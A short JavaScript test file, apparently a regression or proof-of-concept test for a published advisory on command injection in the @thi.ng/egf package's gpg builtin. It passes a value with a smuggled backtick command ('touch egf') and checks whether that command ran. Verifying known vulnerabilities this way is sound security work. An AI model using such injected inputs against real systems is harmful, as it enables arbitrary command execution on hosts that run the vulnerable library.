//https://securitylab.github.com/advisories/GHSL-2021-062-thi-ng-egf-cmd-injection/

test("Command Injection in @thi.ng/egf", () => 
{
	const egf = require("@thi.ng/egf");
	const fs = require('fs');
	const path = './egf';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	try{
		egf.BUILTINS.gpg("foo", "bar`touch egf`", {opts: {decrypt: true}});
	}
	catch(error)
	{

	}
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});